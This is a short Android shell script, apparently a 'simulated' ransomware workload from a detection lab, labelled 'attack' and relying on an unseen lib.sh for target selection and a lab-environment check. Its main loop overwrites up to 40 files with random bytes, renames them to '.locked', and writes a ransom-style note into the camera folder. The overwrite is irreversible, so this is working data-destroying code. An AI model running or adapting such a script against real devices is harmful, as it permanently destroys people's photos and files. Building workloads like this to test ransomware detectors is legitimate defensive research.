#!/system/bin/sh
# A3: Overwrite in-place with random bytes, then mv file -> file.locked
# Supports SPEED=fast (DELAY=0.05) or SPEED=slow (DELAY=0.5)
DIR="$(cd "$(dirname "$0")" && pwd)"
SPEED="${SPEED:-fast}"
if [ "$SPEED" = "slow" ]; then
    WORKLOAD_NAME="${WORKLOAD_NAME:-A3_slow}"
    DEFAULT_DELAY="0.5"
else
    WORKLOAD_NAME="${WORKLOAD_NAME:-A3}"
    DEFAULT_DELAY="0.05"
fi
WORKLOAD_LABEL="attack"
. "$DIR/lib.sh"

MAX_FILES="${MAX_FILES:-40}"
DELAY="${DELAY:-$DEFAULT_DELAY}"

verify_lab_env
log_truth "start"

OLD_IFS="$IFS"
IFS='
'
for f in $(list_attack_targets "$MAX_FILES"); do
    IFS="$OLD_IFS"
    if [ ! -f "$f" ]; then
        log_truth "skip" "$f"
        continue
    fi
    sz="$(file_size "$f")"
    locked="${f}.locked"
    head -c "$sz" /dev/urandom > "$f"
    log_truth "overwrite" "$f"
    mv "$f" "$locked"
    log_truth "rename" "$f" "$locked"
    sleep "$DELAY"
done
IFS="$OLD_IFS"

note="$TARGET_ROOT/DCIM/Camera/README_RESTORE.txt"
printf 'SIMULATION ONLY: Your files were locked in lab trial %s.\n' "$RUN_ID" > "$note"
log_truth "create" "$note"

log_truth "end"